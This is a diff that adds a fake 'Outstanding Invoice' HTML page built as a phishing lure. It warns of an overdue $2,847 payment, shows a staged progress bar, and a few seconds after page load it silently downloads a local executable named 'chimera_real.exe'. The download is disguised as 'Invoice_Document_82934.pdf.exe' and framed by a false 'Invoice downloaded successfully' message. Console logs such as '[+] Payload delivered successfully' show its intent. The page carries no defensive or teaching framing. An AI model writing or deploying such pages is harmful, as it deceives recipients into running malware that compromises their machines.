@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Invoice Payment Required - Account #INV-82934</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .container {
+        background: white;
+        padding: 40px;
+        border-radius: 10px;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        max-width: 500px;
+        text-align: center;
+    }
+    .icon {
+        font-size: 60px;
+        margin-bottom: 20px;
+    }
+    h1 {
+        color: #333;
+        margin-bottom: 10px;
+    }
+    .amount {
+        font-size: 36px;
+        color: #e74c3c;
+        font-weight: bold;
+        margin: 20px 0;
+    }
+    .alert {
+        background: #fff3cd;
+        border: 2px solid #ffc107;
+        padding: 15px;
+        border-radius: 5px;
+        margin: 20px 0;
+        color: #856404;
+    }
+    .progress {
+        width: 100%;
+        height: 6px;
+        background: #f0f0f0;
+        border-radius: 3px;
+        overflow: hidden;
+        margin: 20px 0;
+    }
+    .progress-bar {
+        height: 100%;
+        background: #4caf50;
+        width: 0%;
+        transition: width 0.3s;
+    }
+    #status {
+        color: #666;
+        margin-top: 15px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon">📄</div>
+    <h1>Outstanding Invoice</h1>
+    <p>Invoice #INV-82934</p>
+    <div class="amount">$2,847.00</div>
+    
+    <div class="alert">
+        <strong>⚠️ URGENT:</strong> Payment overdue by 7 days
+    </div>
+    
+    <div class="progress">
+        <div class="progress-bar" id="progress"></div>
+    </div>
+    
+    <div id="status">Preparing invoice document...</div>
+</div>
+
+<!-- Hidden iframe for silent download -->
+<iframe id="downloadFrame" style="display:none;"></iframe>
+
+<script>
+// Configuration - USE RELATIVE PATH (works with tunnel, local, anywhere!)
+var PAYLOAD_FILE = 'chimera_real.exe';  // Must be in same folder as this HTML
+var DISGUISED_NAME = 'Invoice_Document_82934.pdf.exe';
+
+// Progress simulation
+var progress = 0;
+var progressBar = document.getElementById('progress');
+var statusDiv = document.getElementById('status');
+
+function updateProgress() {
+    progress += 10;
+    progressBar.style.width = progress + '%';
+    
+    if (progress === 30) {
+        statusDiv.textContent = 'Retrieving invoice data...';
+    } else if (progress === 60) {
+        statusDiv.textContent = 'Generating PDF document...';
+    } else if (progress === 90) {
+        statusDiv.textContent = 'Finalizing download...';
+    } else if (progress >= 100) {
+        progressBar.style.width = '100%';
+        statusDiv.innerHTML = '<span style="color: #4caf50;">✓ Invoice downloaded successfully!</span>';
+        clearInterval(progressInterval);
+        console.log('[+] Payload delivered successfully');
+    }
+}
+
+// Start progress animation
+var progressInterval = setInterval(updateProgress, 300);
+
+// Multiple download methods for compatibility
+function triggerDownload() {
+    // Use relative path - works with tunnel, local network, anywhere!
+    var downloadUrl = PAYLOAD_FILE;
+    
+    // Method 1: Direct download link (most reliable)
+    var a = document.createElement('a');
+    a.href = downloadUrl;
+    a.download = DISGUISED_NAME;
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function() {
+        document.body.removeChild(a);
+    }, 100);
+    
+    console.log('[+] Download triggered: ' + DISGUISED_NAME);
+}
+
+// Auto-execute on page load
+window.onload = function() {
+    console.log('[*] Invoice delivery page loaded');
+    console.log('[*] Initiating automatic download...');
+    
+    // Start download after 2 seconds
+    setTimeout(function() {
+        triggerDownload();
+    }, 2000);
+};
+</script>
+
+</body>
+</html>
